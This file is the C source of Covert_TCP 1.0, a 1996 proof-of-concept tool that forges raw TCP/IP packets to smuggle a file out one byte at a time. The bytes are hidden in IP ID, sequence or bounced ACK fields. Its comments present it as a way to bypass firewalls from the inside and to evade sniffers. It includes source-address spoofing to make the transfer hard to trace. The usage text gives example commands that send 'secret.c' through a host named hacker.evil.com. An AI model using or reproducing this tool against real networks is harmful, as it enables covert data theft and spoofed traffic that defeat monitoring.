/* Covert_TCP 1.0 - Covert channel file transfer for Linux
* Written by Craig H. Rowland (crowland@psionic.com)
* Copyright 1996 Craig H. Rowland (11-15-96)
* NOT FOR COMMERCIAL USE WITHOUT PERMISSION. 
* 
*
* This program manipulates the TCP/IP header to transfer a file one byte
* at a time to a destination host. This progam can act as a server and a client
* and can be used to conceal transmission of data inside the IP header. 
* This is useful for bypassing firewalls from the inside, and for 
* exporting data with innocuous looking packets that contain no data for 
* sniffers to analyze. In other words, spy stuff... :)
*
* PLEASE see the enclosed paper for more information!!
*
* This software should be used at your own risk. 
*
* compile: cc -o covert_tcp covert_tcp.c
*
*
* 
* Portions of this code based on ping.c (c) 1987 Regents of the 
* University of California. (See function in_cksm() for details)
*
* Small portions from various packet utilities by unknown authors
*/
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#define VERSION "1.0"
/* Prototypes */
void forgepacket(unsigned int, unsigned int, unsigned short, unsigned 
                 short,char *,int,int,int,int); 
unsigned short in_cksum(unsigned short *, int);
unsigned int host_convert(char *);
void usage(char *);
main(int argc, char **argv)
{
   unsigned int source_host=0,dest_host=0;
   unsigned short source_port=0,dest_port=80;
   int ipid=0,seq=0,ack=0,server=0,file=0;
   int count;
   char desthost[80],srchost[80],filename[80];
   
   /* Title */
   printf("Covert TCP %s (c)1996 Craig H. Rowland (crowland@psionic.com)\n",VERSION); 
   printf("Not for commercial use without permission.\n");
  
   /* Can they run this? */
   if(geteuid() !=0)
    {
    printf("\nYou need to be root to run this.\n\n");
    exit(0);
    }
   /* Tell them how to use this thing */
   if((argc < 6) || (argc > 13))
   {
   usage(argv[0]);
   exit(0);
   }
/* No error checking on the args...next version :) */   
   for(count=0; count < argc; ++count)
    {
    if (strcmp(argv[count],"-dest") == 0)
     {
     dest_host=host_convert(argv[count+1]); 
     strncpy(desthost,argv[count+1],79);
     }
    else if (strcmp(argv[count],"-source") == 0)
     {
     source_host=host_convert(argv[count+1]); 
     strncpy(srchost,argv[count+1],79);
     }
    else if (strcmp(argv[count],"-file") == 0)
     {
     strncpy(filename,argv[count+1],79);
     file=1;
     }
    else if (strcmp(argv[count],"-source_port") == 0)
      source_port=atoi(argv[count+1]);
    else if (strcmp(argv[count],"-dest_port") == 0)
      dest_port=atoi(argv[count+1]);
    else if (strcmp(argv[count],"-ipid") == 0)
      ipid=1;
    else if (strcmp(argv[count],"-seq") == 0)
      seq=1;
    else if (strcmp(argv[count],"-ack") == 0)
      ack=1;
    else if (strcmp(argv[count],"-server") == 0)
      server=1;
    }
   /* check the encoding flags */
   if(ipid+seq+ack == 0)
    ipid=1; /* set default encode type if none given */
   else if (ipid+seq+ack !=1)
    {
    printf("\n\nOnly one encoding/decode flag (-ipid -seq -ack) can be used at a time.\n\n");
    exit(1);
    }
   /* Did they give us a filename? */
   if(file != 1)
    {
    printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
    exit(1);
    }
   if(server==0) /* if they want to be a client do this... */
    {   
     if (source_host == 0 && dest_host == 0)
      {
      printf("\n\nYou need to supply a source and destination address for client mode.\n\n");
      exit(1);
      }
     else if (ack == 1)
      {
      printf("\n\n-ack decoding can only be used in SERVER mode (-server)\n\n");
      exit(1);
      }
     else
      {
      printf("Destination Host: %s\n",desthost);
      printf("Source Host     : %s\n",srchost);
       if(source_port == 0)
        printf("Originating Port: random\n");
       else
        printf("Originating Port: %u\n",source_port);
      printf("Destination Port: %u\n",dest_port);
      printf("Encoded Filename: %s\n",filename);
       if(ipid == 1)
        printf("Encoding Type   : IP ID\n");
       else if(seq == 1)
        printf("Encoding Type   : IP Sequence Number\n");
       printf("\nClient Mode: Sending data.\n\n");
      }
     }
    else /* server mode it is */
     {    
     if (source_host == 0 && source_port == 0)
      {
      printf("You need to supply a source address and/or source port for server mode.\n");
      exit(1);
      }
     if(dest_host == 0) /* if not host given, listen for anything.. */
      strcpy(desthost,"Any Host");
     if(source_host == 0)
      strcpy(srchost,"Any Host");
     printf("Listening for data from IP: %s\n",srchost);
     if(source_port == 0)
      printf("Listening for data bound for local port: Any Port\n");
     else
      printf("Listening for data bound for local port: %u\n",source_port);
     printf("Decoded Filename: %s\n",filename);
     if(ipid == 1)
      printf("Decoding Type Is: IP packet ID\n");
     else if(seq == 1)
      printf("Decoding Type Is: IP Sequence Number\n");
     else if(ack == 1)
      printf("Decoding Type Is: IP ACK field bounced packet.\n");
     printf("\nServer Mode: Listening for data.\n\n");
     }
     /* Do the dirty work */
     forgepacket(source_host, dest_host, source_port, dest_port
                ,filename,server,ipid,seq,ack);
exit(0);
}
void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned 
short source_port, unsigned short dest_port, char *filename, int server, int ipid
, int seq, int ack) 
{
   struct send_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
   } send_tcp;
   struct recv_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
      char buffer[10000];
   } recv_pkt;
   /* From synhose.c by knight */
   struct pseudo_header
   {
      unsigned int source_address;
      unsigned int dest_address;
      unsigned char placeholder;
      unsigned char protocol;
      unsigned short tcp_length;
      struct tcphdr tcp;
   } pseudo_header;
   int ch;
   int send_socket;
   int recv_socket;
   struct sockaddr_in sin;
   FILE *input;
   FILE *output;
/* Initialize RNG for future use */
srand((getpid())*(dest_port)); 
/**********************/
/* Client code        */
/**********************/
/* are we the client? */
if(server==0)
{
if((input=fopen(filename,"rb"))== NULL)
 {
 printf("I cannot open the file %s for reading\n",filename);
 exit(1);
 }
else while((ch=fgetc(input)) !=EOF)
 {
/* Delay loop. This really slows things down, but is necessary to ensure */
/* semi-reliable transport of messages over the Internet and will not flood */
/* slow network connections */
/* A better should probably be developed */
sleep(1);
/* NOTE: I am not using the proper byte order functions to initialize */
/* some of these values (htons(), htonl(), etc.) and this will certainly */
/* cause problems on other architectures. I didn't like doing a direct */
/* translation of ASCII into the variables because this looked really */
/* suspicious seeing packets with sequence numbers of 0-255 all the time */
/* so I just read them in raw and let the function mangle them to fit its */
/* needs... CHR */
   /* Make the IP header with our forged information */
   send_tcp.ip.ihl = 5;
   send_tcp.ip.version = 4;
   send_tcp.ip.tos = 0;
   send_tcp.ip.tot_len = htons(40);
/* if we are NOT doing IP ID header encoding, randomize the value */
/* of the IP identification field */
if (ipid == 0)
   send_tcp.ip.id =(int)(255.0*rand()/(RAND_MAX+1.0)); 
else /* otherwise we "encode" it with our cheesy algorithm */
   send_tcp.ip.id =ch;
   send_tcp.ip.frag_off = 0;
   send_tcp.ip.ttl = 64; 
   send_tcp.ip.protocol = IPPROTO_TCP;
   send_tcp.ip.check = 0;
   send_tcp.ip.saddr = source_addr;
   send_tcp.ip.daddr = dest_addr;
/* begin forged TCP header */
if(source_port == 0) /* if the didn't supply a source port, we make one */
   send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
else /* otherwise use the one given */
   send_tcp.tcp.source = htons(source_port);
if(seq==0) /* if we are not encoding the value into the seq number */
   send_tcp.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
else /* otherwise we'll hide the data using our cheesy algorithm one more time. 
*/
   send_tcp.tcp.seq = ch;
   /* forge destination port */
   send_tcp.tcp.dest = htons(dest_port);
  
   /* the rest of the flags */
   /* NOTE: Other covert channels can use the following flags to encode data a 
BIT */
   /* at a time. A good example would be the use of the PSH flag setting to either 
*/
   /* on or off and having the remote side decode the bytes accordingly... CHR */
   send_tcp.tcp.ack_seq = 0;
   send_tcp.tcp.res1 = 0;
   send_tcp.tcp.doff = 5;
   send_tcp.tcp.fin = 0;
   send_tcp.tcp.syn = 1;
   send_tcp.tcp.rst = 0;
   send_tcp.tcp.psh = 0;
   send_tcp.tcp.ack = 0;
   send_tcp.tcp.urg = 0;
//   send_tcp.tcp.res2 = 0;
   send_tcp.tcp.window = htons(512);
   send_tcp.tcp.check = 0;
   send_tcp.tcp.urg_ptr = 0;
   
   /* Drop our forged data into the socket struct */
   sin.sin_family = AF_INET;
   sin.sin_port = send_tcp.tcp.source;
   sin.sin_addr.s_addr = send_tcp.ip.daddr;   
   
   /* Now open the raw socket for sending */
   send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if(send_socket < 0)
   {
      perror("send socket cannot be open. Are you root?");
      exit(1);
   }
      /* Make IP header checksum */
      send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
      /* Final preparation of the full header */
      /* From synhose.c by knight */
      pseudo_header.source_address = send_tcp.ip.saddr;
      pseudo_header.dest_address = send_tcp.ip.daddr;
      pseudo_header.placeholder = 0;
      pseudo_header.protocol = IPPROTO_TCP;
      pseudo_header.tcp_length = htons(20);
      bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
      /* Final checksum on the entire package */
      send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
      /* Away we go.... */
      sendto(send_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
      printf("Sending Data: %c\n",ch);
  close(send_socket);
 } /* end while(fgetc()) loop */
fclose(input);
}/* end if(server == 0) loop */
/***********************/
/* Passive server code */
/***********************/
/* we are the server so now we listen */
else
{
 if((output=fopen(filename,"wb"))== NULL)
  {
  printf("I cannot open the file %s for writing\n",filename);
  exit(1);
  }
/* Now we read the socket. This is not terribly fast at this time, and has the same 
*/
/* reliability as UDP as we do not ACK the packets for retries if they are bad. */
/* This is just proof of concept... CHR*/
 while(1) /* read packet loop */
 {
   /* Open socket for reading */
   recv_socket = socket(AF_INET, SOCK_RAW, 6);
   if(recv_socket < 0)
   {
      perror("receive socket cannot be open. Are you root?");
      exit(1);
   }
  /* Listen for return packet on a passive socket */
  read(recv_socket, (struct recv_tcp *)&recv_pkt, 9999);
        /* if the packet has the SYN/ACK flag set and is from the right 
address..*/
        if (source_port == 0) /* the user does not care what port we come from 
*/
        {       /* check for SYN/ACK flag set and correct inbound IP source 
address */
                if((recv_pkt.tcp.syn == 1) && (recv_pkt.ip.saddr == 
source_addr)) 
                {
                /* IP ID header "decoding" */
                /* The ID number is converted from it's ASCII equivalent back to 
normal */
                        if(ipid==1)
                        {
                        printf("Receiving Data: %c\n",recv_pkt.ip.id);
                        fprintf(output,"%c",recv_pkt.ip.id);
                        fflush(output);
                        }
                        /* IP Sequence number "decoding" */
                        else if (seq==1)
                        {
                        printf("Receiving Data: %c\n",recv_pkt.tcp.seq);
                        fprintf(output,"%c",recv_pkt.tcp.seq); 
                        fflush(output);
                        }
        /* Use a bounced packet from a remote server to decode the data */
        /* This technique requires that the client initiates a SEND to */
        /* a remote host with a SPOOFED source IP that is the location */
        /* of the listening server. The remote server will receive the packet */
        /* and will initiate an ACK of the packet with the encoded sequence */
        /* number+1 back to the SPOOFED source. The covert server is waiting at this */
        /* spoofed address and can decode the ack field to retrieve the data */
        /* this enables an "anonymous" packet transfer that can bounce */
        /* off any site. This is VERY hard to trace back to the originating */
        /* source. This is pretty nasty as far as covert channels go... */
        /* Some routers may not allow you to spoof an address outbound */
        /* that is not on their network, so it may not work at all sites... */
        /* SENDER should use covert_tcp with the -seq flag and a forged -source */
        /* address. RECEIVER should use the -server -ack flags with the IP of */
        /* of the server the bounced message will appear from.. CHR */
        /* The bounced ACK sequence number is really the original sequence*/
        /* plus one (ISN+1). However, the translation here drops some of the */
        /* bits so we get the original ASCII value...go figure.. */
                        else if (ack==1)
                        {
                         printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);
                         fprintf(output,"%c",recv_pkt.tcp.ack_seq); 
                         fflush(output);
                        }
                } /* end if loop to check for ID/sequence decode */
        } /* End if loop checking for port number given */
/* if the packet has the SYN/ACK flag set and is destined to the right port..*/
/* we'll grab it regardless if IP addresses. This is useful for bouncing off of */
/* multiple hosts to a single server address */
        else
        {
                if((recv_pkt.tcp.syn==1) && (ntohs(recv_pkt.tcp.dest) == 
source_port)) 
                {
                        /* IP ID header "decoding" */
                        /* The ID number is converted from it's ASCII equivalent back 
to normal */
                        if(ipid==1)
                        {
                        printf("Receiving Data: %c\n",recv_pkt.ip.id);
                        fprintf(output,"%c",recv_pkt.ip.id);
                        fflush(output);
                        }
                        /* IP Sequence number "decoding" */
                        else if (seq==1)
                        {
                        printf("Receiving Data: %c\n",recv_pkt.tcp.seq);
                        fprintf(output,"%c",recv_pkt.tcp.seq); 
                        fflush(output);
                        }
                        /* Do the bounce decode again... */
                        else if (ack==1)
                        {
                        printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);
                        fprintf(output,"%c",recv_pkt.tcp.ack_seq); 
                        fflush(output);
                        }
                } /* end if loop to check for source port decoding */
        } /* end else loop to see if port number given to listen on */
   close(recv_socket); /* close the socket so we don't hose the kernel */
  }/* end while() read packet loop */
  fclose(output);
 } /* end else(serverloop) function */
} /* end forgepacket() function */
/* clipped from ping.c (this function is the whore of checksum routines */
/* as everyone seems to use it..I feel so dirty...) */
/* Copyright (c)1987 Regents of the University of California.
* All rights reserved.
*
* Redistribution and use in source and binary forms are permitted
* provided that the above copyright notice and this paragraph are
* dupliated in all such forms and that any documentation, advertising 
* materials, and other materials related to such distribution and use
* acknowledge that the software was developed by the University of
* California, Berkeley. The name of the University may not be used
* to endorse or promote products derived from this software without
* specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
* IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, 
* WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND 
* FITNESS FOR A PARTICULAR PURPOSE
*/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
        register long           sum;            /* assumes long == 32 bits 
*/
        u_short                 oddbyte;
        register u_short        answer;         /* assumes u_short == 16 bits */
        /*
         * Our algorithm is simple, using a 32-bit accumulator (sum),
         * we add sequential 16-bit words to it, and at the end, fold back
         * all the carry bits from the top 16 bits into the lower 16 bits.
         */
        sum = 0;
        while (nbytes > 1)  {
                sum += *ptr++;
                nbytes -= 2;
        }
                                /* mop up an odd byte, if necessary */
        if (nbytes == 1) {
                oddbyte = 0;            /* make sure top half is zero */
                *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
                sum += oddbyte;
        }
        /*
         * Add back carry outs from top 16 bits to low 16 bits.
         */
        sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
        sum += (sum >> 16);                     /* add carry */
        answer = ~sum;          /* ones-complement, then truncate to 16 bits 
*/
        return(answer);
} /* end in_cksm()
/* Generic resolver from unknown source */
unsigned int host_convert(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
} /* end resolver */
/* Tell them how to use this */
void usage(char *progname)
{
      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename -source_port port -dest_port port -server [encode type]\n\n", 
progname);
      printf("-dest dest_ip      - Host to send data to.\n");
      printf("-source source_ip  - Host where you want the data to originate from.\n");
      printf("                     In SERVER mode this is the host data will\n");
      printf("                     be coming FROM.\n");
      printf("-source_port port  - IP source port you want data to appear from. \n");
      printf("                     (randomly set by default)\n");
      printf("-dest_port port    - IP source port you want data to go to. In\n");
      printf("                     SERVER mode this is the port data will be coming\n");
      printf("                     inbound on. Port 80 by default.\n");
      printf("-file filename     - Name of the file to encode and transfer.\n");
      printf("-server            - Passive mode to allow receiving of data.\n");
      printf("[Encode Type] - Optional encoding type\n");
      printf("-ipid - Encode data a byte at a time in the IP packet ID.  [DEFAULT]\n");
      printf("-seq  - Encode data a byte at a time in the packet sequence number.\n");
      printf("-ack  - DECODE data a byte at a time from the ACK field.\n");
      printf("        This ONLY works from server mode and is made to decode\n");
      printf("        covert channel packets that have been bounced off a remote\n");
      printf("        server using -seq. See documentation for details\n");
      printf("\nPress ENTER for examples.");
      getchar();
      printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com - source_port 1234 -dest_port 80 -file secret.c\n\n"); printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
      printf("at a time using the default IP packet ID encoding.\n");
      printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com - dest_port 80 -server -file secret.c\n\n");
      printf("Above listens passively for packets from  hacker.evil.com\n");
      printf("destined for port 80. It takes the data and saves the file locally\n");
      printf("as secret.c\n\n");
      exit(0);
} /* end usage() */
